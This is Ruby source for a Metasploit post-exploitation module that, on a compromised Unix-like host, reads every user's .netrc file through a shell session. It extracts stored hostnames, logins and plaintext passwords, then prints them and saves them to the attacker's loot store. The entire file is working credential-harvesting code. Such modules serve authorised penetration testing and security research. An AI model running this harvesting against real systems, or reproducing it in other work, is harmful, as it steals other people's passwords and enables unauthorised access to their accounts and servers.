##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Post

  include Msf::Post::File
  include Msf::Post::Unix

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'UNIX Gather .netrc Credentials',
        'Description'   => %q{
          Post Module to obtain credentials saved for FTP and other services in .netrc
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Jon Hart <jhart[at]spoofed.org>' ],
        'Platform'      => [ 'bsd', 'linux', 'osx', 'unix' ],
        'SessionTypes'  => [ 'shell' ]
      ))
  end

  def run
    # A table to store the found credentials.
    cred_table = Rex::Ui::Text::Table.new(
    'Header'    => ".netrc credentials",
    'Indent'    => 1,
    'Columns'   =>
    [
      "Username",
      "Password",
      "Server",
    ])

    # all of the credentials we've found from .netrc
    creds = []

    # walk through each user directory
    enum_user_directories.each do |user_dir|
      netrc_file = user_dir + "/.netrc"
      # the current credential from .netrc we are parsing
      cred = {}
      begin
        print_status("Reading: #{netrc_file}")
        # read their .netrc
        cmd_exec("test -r #{netrc_file} && cat #{netrc_file}").each_line do |netrc_line|
          # parse it
          netrc_line.strip!
          # get the machine name
          if (netrc_line =~ /machine (\S+)/)
            # if we've already found a machine, save this cred and start over
            if (cred[:host])
              creds << cred
              cred = {}
            end
            cred[:host] = $1
          end
          # get the user name
          if (netrc_line =~ /login (\S+)/)
            cred[:user] = $1
          end
          # get the password
          if (netrc_line =~ /password (\S+)/)
            cred[:pass] = $1
          end
        end

        # save whatever remains of this last cred if it is worth saving
        creds << cred if (cred[:host] and cred[:user] and cred[:pass])

      rescue ::Exception => e
        print_error("Couldn't read #{netrc_file}: #{e.to_s}")
      end
    end

    # print out everything we've found
    creds.each do |cred|
      cred_table << [ cred[:user], cred[:pass], cred[:host] ]
    end

    if cred_table.rows.empty?
      print_status("No creds collected")
    else
      print_line("\n" + cred_table.to_s)

      # store all found credentials
      p = store_loot(
        "netrc.creds",
        "text/csv",
        session,
        cred_table.to_csv,
        "netrc_credentials.txt",
        ".netrc credentials")

      print_status("Credentials stored in: #{p.to_s}")
    end
  end

end
